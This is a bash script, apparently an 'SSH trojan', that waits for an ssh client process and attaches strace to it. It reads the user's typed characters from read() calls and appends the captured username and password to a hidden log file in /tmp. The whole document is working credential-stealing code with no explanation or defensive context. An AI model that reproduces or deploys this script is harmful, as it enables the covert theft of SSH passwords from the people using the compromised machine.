#!/bin/bash
logfile="/tmp/.log_sshtrojan2.txt"
while true :
do
    # while loop to wait for ssh process
    username=""
    password=""
    PID=`ps ax | grep -w ssh | grep @  | head -n1 | awk '{ print $1}'` 
    # if ssh process is created
    if [[ $PID != "" ]]; then
        #get username
        username=`ps ax | grep ssh | grep @ |head -n1 | awk ' {print $6} ' | cut -d'@' -f1`
        regex="read\(4, \".*\", 1\)"
        #read strace output to extract password
        strace -f -p $PID -e trace=read --status=successful 2>&1 | while read -r line; do
            #if matched regex
            if [[ $line =~ $regex ]]; then
                #get char from user input
                char=`echo $line | grep -o -P '(?<=").*(?=")'`
                if [[ $char == "\\n" || $char == "\\r" ]]; then
                    echo "Username : $username, Password : $password" >> $logfile
                    break
                else
                    password+=$char
                fi
            fi
        done;
    fi
done

